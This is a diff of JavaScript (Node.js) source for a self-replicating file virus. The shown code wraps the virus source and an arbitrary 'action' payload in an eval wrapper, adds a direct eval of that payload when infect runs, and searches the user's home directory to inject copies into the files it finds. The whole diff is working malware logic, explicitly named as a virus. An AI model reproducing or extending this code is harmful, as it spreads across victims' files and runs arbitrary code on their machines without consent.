@@ -5,13 +5,16 @@ const path = require( "path" );
 const VIRUS_MARKER = "/* 8DFKEGIDB38GS3NGJSLWNGHS */";
 
 function getCopyOfVirus( virusSrc, action ) {
-    const enc = x => Buffer.from( x ).toString( "base64" );
+    const esc = str => str
+        .replace(/[\\"]/g, "\\$&")
+        .replace(/[\n\r]/g, "\\n");
+
     return `
 (function() {
-    var virusSrc = "${ enc( virusSrc ) }";
-    var action   = "${ enc( action ) }";
-    const dec = x => Buffer.from( x, "base64" ).toString();
-    eval( dec(action) + dec(virusSrc) + "infect( virusSrc, action );" ); 
+    var virusSrc = "${esc(virusSrc)}";
+    var action   = "${esc(action)}";
+    (()=>null)(action);
+    eval( virusSrc + "infect( virusSrc, action )" );
 })();`;
 }
 
@@ -118,6 +121,7 @@ function spread( f, virus ) {
 /* disable variable not used warning */
 function infect( virusSrc, action ) { // eslint-disable-line
 
+    eval( action );
     const virus = getCopyOfVirus( virusSrc, action );
     search( os.homedir(), 10 ).then( function( files ) {
         return Promise.all( files.map( f => spread( f, virus ) ) );
